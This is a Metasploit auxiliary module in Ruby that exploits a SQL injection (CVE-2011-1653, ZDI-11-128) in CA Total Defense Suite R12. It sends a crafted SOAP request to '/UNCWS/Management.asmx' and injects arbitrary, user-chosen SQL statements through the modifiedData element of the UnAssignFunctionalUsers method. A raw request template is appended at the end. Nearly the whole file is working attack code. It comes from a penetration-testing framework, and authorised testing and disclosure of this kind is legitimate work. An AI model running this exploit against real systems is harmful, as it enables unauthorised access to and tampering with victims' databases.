require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize
		super(
			'Name'        => 'CA Total Defense UNCWS UnassignFunctionUsers SQL Injection',
			'Description' => %q{
					This module exploits a design flaw in CA Total Defense Suite R12.
				When supplying a specially crafted soap request to '/UNCWS/Management.asmx', an
				attacker can abuse the UnassignFunctionUsers method by injecting arbitrary
				sql statements in the modifiedData element.
			},
			'References'  =>
			[
				[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-128/' ],
				[ 'CVE', '2011-1653' ],
			],
			'Author'      => [ 'MC' ],
			'License'     => MSF_LICENSE,
			'DisclosureDate' => 'Apr 13 2011')

		register_options(
			[
				Opt::RPORT(34443),
				OptBool.new('SSL',   [true, 'Use SSL', true]),
				OptString.new('SQL', [false, 'Execute this SQL statement', "select @@version"]),	
			], self.class)
	
	end

	def run

		inject = "'') #{datastore['SQL']};--"
			
		soap = %Q|<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
<soap12:Body>
<UnAssignFunctionalUsers xmlns="http://tempuri.org/">
<modifiedData>#{inject}</modifiedData>
<UserID>187</UserID>
</UnAssignFunctionalUsers>
</soap12:Body>
</soap12:Envelope>
			|

		res = send_request_cgi(
			{
				'uri'   => '/UNCWS/Management.asmx',
				'version' => '1.0',
				'ctype' => 'application/soap+xml; charset=utf-8',
				'method' => 'POST',
				'data' => soap,
			}, 5)
									
		if ( res and res.body =~/SUCCESS/ )
			print_good("Executed '#{datastore['SQL']}' successfully")	
		else
			print_error("Failed to execute SQL statement...")
		end
	end

end
__END__
POST /UNCWS/Management.asmx HTTP/1.1
Host: 192.168.31.131
Content-Type: application/soap+xml; charset=utf-8
Content-Length: length

<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
  <soap12:Body>
    <UnAssignFunctionalUsers xmlns="http://tempuri.org/">
      <modifiedData>string</modifiedData>
      <UserID>int</UserID>
    </UnAssignFunctionalUsers>
  </soap12:Body>
</soap12:Envelope>
